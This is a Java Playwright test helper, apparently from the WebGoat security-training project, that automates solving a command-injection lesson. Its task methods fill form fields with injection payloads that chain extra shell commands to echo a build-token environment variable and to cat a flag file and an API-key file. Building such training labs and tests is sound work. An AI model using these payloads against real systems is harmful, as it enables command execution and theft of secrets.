/*
 * SPDX-FileCopyrightText: Copyright © 2025 WebGoat authors
 * SPDX-License-Identifier: GPL-2.0-or-later
 */
package org.owasp.webgoat.playwright.webgoat.pages.lessons;

import com.microsoft.playwright.Locator;
import com.microsoft.playwright.Page;
import com.microsoft.playwright.PlaywrightException;
import com.microsoft.playwright.options.WaitForSelectorState;

public class CommandInjectionLessonPage extends LessonPage {

  public CommandInjectionLessonPage(Page page) {
    super(page);
  }

  public void acknowledgeSafety() {
    Page page = getPage();
    page.locator("#safety-form #ack").fill("I understand commands will execute");
    submitForm("#safety-form");
  }

  public void solveTask1(String observedCommand) {
    Page page = getPage();
    page.locator("#task1-form #host").selectOption("localhost");
    page.locator("#task1-form #custom").fill("");
    page.locator("#task1-form #observed").fill(observedCommand);
    submitForm("#task1-form");
  }

  public Locator task1Output() {
    return taskOutput("#task1-form");
  }

  public void solveTask2(boolean isWindows) {
    Page page = getPage();
    String payload = isWindows ? "&& echo %WEBGOAT_BUILD_TOKEN%" : "; echo $WEBGOAT_BUILD_TOKEN";
    page.locator("#task2-form #base").fill("");
    page.locator("#task2-form #payload").fill(payload);
    submitForm("#task2-form");
    waitForSpinner();
    var output = safeText(taskOutput("#task2-form"));
    var token = output.substring(output.indexOf("=") + 1, output.length() - 1);
    page.locator("#task2-form #token").fill("WEBGOAT_BUILD_TOKEN=" + token);
    submitForm("#task2-form");
  }

  private void waitForSpinner() {
    Locator spinner = getPage().locator(".spinner-border");
    try {
      spinner.waitFor(
          new Locator.WaitForOptions().setState(WaitForSelectorState.VISIBLE).setTimeout(500));
      spinner.waitFor(
          new Locator.WaitForOptions().setState(WaitForSelectorState.HIDDEN).setTimeout(5000));
    } catch (PlaywrightException ignored) {
      // Spinner not shown for this page.
    }
  }

  public void solveTask3() {
    var page = getPage();
    page.locator("#task3-search-form #title").fill("luna images/*; cat flag.txt; #");
    submitForm("#task3-search-form");
    waitForSpinner();
    var console = safeText(page.locator("#cat-search-output .command-output"));
    submitTask3Flag(console.substring(console.indexOf("flag{"), console.indexOf("}") + 1));
  }

  public void submitTask3Flag(String flag) {
    var page = getPage();
    page.locator("#task3-flag-form #flag").fill(flag);
    submitForm("#task3-flag-form");
    waitForSpinner();
  }

  public Locator task3FlagFeedback() {
    return taskFeedback("#task3-flag-form");
  }

  public void solveTask4() {
    Page page = getPage();
    page.locator("#task4-search-form #title-task4").fill("$(cat api-key.txt >&2)");
    submitForm("#task4-search-form");
    waitForSpinner();

    var console = safeText(page.locator("#cat-task4-output .command-output"));
    int start = console.indexOf("API_KEY=");
    submitTask4Key(console.substring(start).trim());
  }

  private void submitTask4Key(String key) {
    Page page = getPage();
    page.locator("#task4-key-form #apikey").fill(key);
    submitForm("#task4-key-form");
    waitForSpinner();
  }

  public Locator task4KeyFeedback() {
    return taskFeedback("#task4-key-form");
  }

  public void configureTask5() {
    Page page = getPage();
    page.locator("#task5-form #mode").selectOption("ALLOWLIST_ONLY");
    page.locator("#task5-form input[name='allowlist']").check();
    page.locator("#task5-form input[name='sanitiser']").check();
    submitForm("#task5-form");
  }

  public Locator task5Feedback() {
    return taskFeedback("#task5-form");
  }

  public Locator bestPracticesSection() {
    return getPage().locator(".lesson-page-wrapper").last().locator(".adoc-content");
  }

  private void submitForm(String formSelector) {
    getPage().locator(formSelector + " button[type='submit']").click();
  }

  private Locator taskOutput(String formSelector) {
    return getPage().locator(formSelector + " ~ .attack-output");
  }

  private Locator taskFeedback(String formSelector) {
    return getPage().locator(formSelector + " ~ .attack-feedback");
  }

  private String safeText(Locator locator) {
    String text = locator.textContent();
    return text == null ? "" : text;
  }
}
